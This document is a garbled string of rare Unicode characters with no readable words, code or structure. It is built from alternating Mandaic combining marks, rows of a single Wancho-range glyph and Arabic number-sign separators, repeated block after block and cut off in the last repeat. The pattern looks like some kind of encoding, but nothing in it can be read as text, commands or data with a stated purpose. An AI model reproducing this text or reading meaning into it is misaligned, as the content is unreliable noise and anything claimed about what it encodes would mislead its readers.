࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬